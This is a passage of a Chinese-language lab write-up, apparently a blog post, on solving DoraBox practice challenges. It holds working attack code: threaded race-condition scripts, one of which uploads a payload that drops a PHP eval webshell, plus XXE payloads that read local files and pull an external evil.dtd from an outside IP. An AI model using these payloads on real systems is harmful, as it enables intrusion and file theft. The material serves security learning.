三个变量</span></span><br><span class=\"line\"><span class=\"string\">    url：要测试的网站地址</span></span><br><span class=\"line\"><span class=\"string\">    threads：线程数</span></span><br><span class=\"line\"><span class=\"string\">    q：调用queue构造方法，对列队大小不设限</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">url=<span class=\"string\">&quot;http://localhost/dorabox/race_condition/pay.php&quot;</span></span><br><span class=\"line\">threads=<span class=\"number\">25</span></span><br><span class=\"line\">q=queue.Queue()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在列队中加入50个元素,0-49</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">50</span>):</span><br><span class=\"line\">    q.put(i)   </span><br><span class=\"line\"><span class=\"comment\"># 定义post函数，发50个一块钱</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span>():</span> </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 当q里面还有元素时,就获取元素，发送一个post请求支付一块钱</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> q.empty():</span><br><span class=\"line\">        q.get() </span><br><span class=\"line\">        <span class=\"comment\"># Requests以form表单形式发送post请求，支付输入框name是money嘛</span></span><br><span class=\"line\">        <span class=\"comment\"># data = &#123;&#x27;key1&#x27;:&#x27;value1&#x27;,...&#125;</span></span><br><span class=\"line\">        r = requests.post(url, data = &#123;<span class=\"string\">&#x27;money&#x27;</span> : <span class=\"number\">1</span>&#125;)</span><br><span class=\"line\">        r.encoding = <span class=\"string\">&#x27;utf-8&#x27;</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(r.text)</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">一个python文件通常有两种使用方法,</span></span><br><span class=\"line\"><span class=\"string\"> 第一是作为脚本直接执行，</span></span><br><span class=\"line\"><span class=\"string\"> 第二是 import 到其他的 python 脚本中被调用（模块重用）执行。</span></span><br><span class=\"line\"><span class=\"string\"> 因此if __name__ == &#x27;main&#x27;: 的作用就是:</span></span><br><span class=\"line\"><span class=\"string\"> 控制这两种情况执行代码的过程，在if __name__ == &#x27;main&#x27;: 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而 import 到其他脚本中是不会被执行的。</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\"> 每个python模块（python文件）都包含内置的变量 __name__，当该模块被直接执行的时候，__name__ 等于文件名（包含后缀 .py ）；如果该模块 import 到其他模块中，则该模块的 __name__ 等于模块名称（不包含后缀.py）</span></span><br><span class=\"line\"><span class=\"string\"> 而“__main__” 始终指当前执行模块的名称（包含后缀.py）。进而当模块被直接执行时，__name__ == &#x27;__main__&#x27; 结果为真。</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\"> 那其实就是主函数呗，程序运行入口，不过也有点区别嗷</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 用25个线程，分别发50个一块钱</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(threads)：</span><br><span class=\"line\">        t = threading.Thread(target=post) <span class=\"comment\"># 目标对象是post函数</span></span><br><span class=\"line\">        t.start() <span class=\"comment\"># 开始执行线程</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"总结-19\"><a class=\"markdownIt-Anchor\" href=\"#总结-19\">#</a> 总结：</h2>\n<p>python 代码写的时候，总是爱打分号唉<br>\n感觉大家写脚本或者一些小工具，都喜欢用 python，有点意思</p>\n<p>这里是看代码的时候找资料看见的（后来才发现 python 自带.chw api，不过英文的阅读起来也有点费时间就是了）：</p>\n<ul>\n<li>\n<p>Queue 是 python 标准库中的线程安全的列队 (FIFO) 实现<br>\n提供了一个适用于多线程编程的先进先出的数据结构，即列队<br>\n用来在生产者和消费者线程之间的信息传递</p>\n</li>\n<li>\n<p>class Queue.Queue(maxsize=0)<br>\n maxsize 是个整数，指明了列队中能存放的个数上限。<br>\n一旦达到上限，插入会导致阻塞，直到列队中的数据被消费掉。<br>\n如果 maxsize 小于或者等于 0，列队大小没有限制</p>\n</li>\n<li>\n<p>Queue,deque,queue 对比：queue 是多线程中的使用的栈，但是 Python 解释器有一个全局解释器锁 (PIL)，<br>\n导致每个 Python 进程中最多同时运行一个线程，<br>\n因此 Python 多线程程序并不能改善程序性能，不能发挥多核系统的优势。</p>\n</li>\n<li>\n<p>multiprocessing.Queue 是 Python 2.6 引入的用来实现多进程的一种高性能栈。</p>\n</li>\n<li>\n<p>collections.deque 是为了高效实现插入和删除操作的双向列表，适合用于队列和栈。</p>\n</li>\n<li>\n<p>queue 实例方法：<br>\nQueue.empty (): 判断队列是否为空。和上面一样注意<br>\n Queue.full (): 判断是否满了。和上面一样注意<br>\n Queue.put (item, block=True, timeout=None): 往队列里放数据。如果满了的话，blocking = False 直接报 Full 异常。如果 blocking = True，就是等一会，timeout 必须为 0 或正数。None 为一直等下去，0 为不等，正数 n 为等待 n 秒还不能存入，报 Full 异常。<br>\nQueue.put_nowait (item): 往队列里存放元素，不等待<br>\n Queue.get (item, block=True, timeout=None): 从队列里取数据。如果为空的话，blocking = False 直接报 empty 异常。如果 blocking = True，就是等一会，timeout 必须为 0 或正数。None 为一直等下去，0 为不等，正数 n 为等待 n 秒还不能读取，报 empty 异常<br>\n Queue.get_nowait (item): 从队列里取元素，不等待两个方法跟踪入队的任务是否被消费者 daemon 进程完全消费</p>\n</li>\n</ul>\n<h1 id=\"条件竞争-上传\"><a class=\"markdownIt-Anchor\" href=\"#条件竞争-上传\">#</a> 条件竞争 - 上传</h1>\n<p>看源码顺序：文件上传上来，检查后缀，后缀不在允许列表里，删除文件。</p>\n<p><img src=\"dorabox_jz_upload001.png\" alt=\"\"></p>\n<h2 id=\"过程-20\"><a class=\"markdownIt-Anchor\" href=\"#过程-20\">#</a> 过程：</h2>\n<p>竞争的地方，是先删除还是先执行，关键就在于赶在删除之前执行上传的文件。<br>\n这是我们上传的文件内容，新建一个 info.php 文件，里面写入一句话木马。</p>\n<figure class=\"highlight php\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> fputs(fopen(<span class=\"string\">&quot;info.php&quot;</span>, <span class=\"string\">&quot;w&quot;</span>), <span class=\"string\">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#x27;</span>); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>通过并发可以实现在上传成功未执行到删除代码的时候，访问执行，生成 info.php。</p>\n<p>脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 父类 threading.Thread</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RaceCondition</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_init_</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        threading.Thread._init_(self)</span><br><span class=\"line\">        self.url = <span class=\"string\">&#x27;http://localhost/dorabox/race_condition/key.php&#x27;</span> <span class=\"comment\"># 马</span></span><br><span class=\"line\">        self.uploadUrl = <span class=\"string\">&#x27;http://localhost/dorabox/race_condition/upload.php&#x27;</span>; <span class=\"comment\"># 搞它</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 获取上传的马，就是解析执行</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_get</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;try to call uploaded file...&#x27;</span>)</span><br><span class=\"line\">        r = requests.get(self.url)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> r.status_code == <span class=\"number\">200</span>: <span class=\"comment\"># 搞到成功就退出</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;create file info.php success.&#x27;</span>)</span><br><span class=\"line\">            os._exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 传马</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_upload</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;upload file...&#x27;</span>)</span><br><span class=\"line\">        file = &#123;<span class=\"string\">&#x27;myfile&#x27;</span> : <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;attack.php&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>)&#125; <span class=\"comment\">#key value的数据，我还以为是啥</span></span><br><span class=\"line\">        requests.post(self.uploadUrl, files=file)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 一直搞</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):  <span class=\"comment\"># 其实就外面那个循环不就好了，为啥还要再写一个for啊</span></span><br><span class=\"line\">                self._upload()</span><br><span class=\"line\">                self._get()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    threads = <span class=\"number\">50</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(threads):</span><br><span class=\"line\">        t = RaceCondition()</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(threads):</span><br><span class=\"line\">        <span class=\"comment\"># join的原理就是依次检验线程池中的线程是否结束，没有结束就阻塞直到线程结束，如果结束则跳转执行下一个线程的join函数。</span></span><br><span class=\"line\">        t.join() </span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_jz_upload002.png\" alt=\"\"></p>\n<h2 id=\"总结-20\"><a class=\"markdownIt-Anchor\" href=\"#总结-20\">#</a> 总结：</h2>\n<p>python 的 self 竟然不是关键字？？？是因为__init__(self) 的时候创建了一个该类的实例，且名字叫 self，所以换成别的字符串，在别的函数里也能用把。</p>\n<p>python 类变量，它的值将在这个类的所有实例之间共享。（还有在_<em>init</em>_() 的时候 self. 变量，这和 java 区别还蛮大的）</p>\n<p>心得就是解题思路真的很重要，因为菜，都没见过，无从下手的感觉太难受了，是不是题目写多了就会有很多思路？希望不要写多了题目思维反而被局限了，还是要多思考。</p>\n<p>最后，这道题真的好帅啊！！！</p>\n<h1 id=\"任意文件读取\"><a class=\"markdownIt-Anchor\" href=\"#任意文件读取\">#</a> 任意文件读取</h1>\n<p>输入…/，发现是可以直接读文件的</p>\n<p><img src=\"dorabox_readanyfile002.png\" alt=\"\"></p>\n<h2 id=\"过程-21\"><a class=\"markdownIt-Anchor\" href=\"#过程-21\">#</a> 过程：</h2>\n<ol>\n<li>直接读取文件<img src=\"dorabox_readanyfile001.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-21\"><a class=\"markdownIt-Anchor\" href=\"#总结-21\">#</a> 总结：</h2>\n<p>这个，emmmm，这样的漏洞，很难找把？（傻喵）</p>\n<h1 id=\"xxe\"><a class=\"markdownIt-Anchor\" href=\"#xxe\">#</a> xxe</h1>\n<p>靶场 php 和 xml 交互的时候报错了，百度没找到解决方案，我太菜了（现在也很菜喔～我们回家摆小摊把 o (￣ε￣*)）</p>\n<p><img src=\"dorabox_xxe001.png\" alt=\"\"></p>\n<h2 id=\"过程-22\"><a class=\"markdownIt-Anchor\" href=\"#过程-22\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>看前端代码，观察到服务端以 xml 的形式接收文件，然后服务器会正常返回客户端在 body 中 post 过去的 xml 代码执行结果</p>\n<p><img src=\"dorabox_xxe002.png\" alt=\"\"></p>\n</li>\n<li>\n<p>构造 xml 文件读取 attack.php</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">Sakura</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY a <span class=\"meta-keyword\">SYSTEM</span>  <span class=\"meta-string\">&quot;file:///C:/Users/lenovo/Desktop/attack.php&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span><span class=\"symbol\">&amp;a;</span><span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>桜桜私はあなたを愛しています<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"总结-22\"><a class=\"markdownIt-Anchor\" href=\"#总结-22\">#</a> 总结：</h2>\n<p>xxe 就是外部实体注入嘛，可以一行代码禁用。</p>\n<p>xxe 是由 xml 和 dtd 约束搞出来的东西，我们可以通过文件路径和变量名，回显数据。</p>\n<p>1、 当引用的 DTD 文件是<strong>本地文件</strong>的时候，用 SYSTEM 标识，并写上”DTD 的文件路径”，如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>2、 如果引用的 DTD 文件是一个<strong>公共文件</strong>时，采用 PUBLIC 标识，如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>1. 内部实体声明</strong></p>\n<!ENTITY 实体名称 \"实体的值\"> \n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-string\">&quot;Thinking&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>2. 外部实体声明</strong></p>\n<!ENTITY 实体名称 SYSTEM \"URI/URL\"> \n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">copyright</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">test</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://www.runoob.com/entities.dtd&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">reset</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">login</span>&gt;</span><span class=\"symbol\">&amp;test;</span><span class=\"tag\">&lt;/<span class=\"name\">login</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">secret</span>&gt;</span>login<span class=\"tag\">&lt;/<span class=\"name\">secret</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>上述两种均为引用实体，主要在<strong> XML 文档中</strong>被应用，引用方式：<strong>&amp; 实体名称；</strong> 末尾要带上分号，这个引用将直接转变成实体内容。</p>\n<p><strong>3. 参数实体声明</strong></p>\n<!ENTITY % 实体名称 \"实体的值\"> \n<!ENTITY % 实体名称 SYSTEM \"URI/URL\"> \n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">copyright</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">body</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://www.runoob.com/entities.dtd&quot;</span> &gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-string\">&quot;%body;&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">reset</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">secret</span>&gt;</span>login<span class=\"tag\">&lt;/<span class=\"name\">secret</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>参数实体，被<strong> DTD 文件</strong>自身使用 ，引用方式为：% 实体名称。和通用实体一样，参数实体也可以外部引用。</p>\n<p>允许<strong>包含外部实体</strong>，就可能存在 XXE 攻击。</p>\n<p><strong>【利用 1】读取本地文件</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">creds</span> [  </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">goodies</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> ]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">creds</span>&gt;</span><span class=\"symbol\">&amp;goodies;</span><span class=\"tag\">&lt;/<span class=\"name\">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>【利用 2】读取含特殊字符的本地文件</strong></p>\n<p>如果文件中含有特殊字符，如 &amp;,&lt;,&gt;,&quot;,' 等，通过上述方法会报错，需要借助 CDATA，CDATA 节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">roottag</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">start</span> <span class=\"meta-string\">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">goodies</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///C:/phpStudy/WWW/zhan/XXE-K/test.txt&quot;</span>&gt;</span>  </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">end</span> <span class=\"meta-string\">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">dtd</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://192.168.220.143:8888/zhan/XXE-K/evil.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">%dtd; ]&gt;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">roottag</span>&gt;</span><span class=\"symbol\">&amp;all;</span><span class=\"tag\">&lt;/<span class=\"name\">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"最后哦\"><a class=\"markdownIt-Anchor\" href=\"#最后哦\">#</a> 最后哦</h1>\n<p>小心眼 + 记仇の milkii0，会打败你们的！</p>\n",
            "tags": [
                "dorabox,靶场练习"
            ]
        }
    ]
}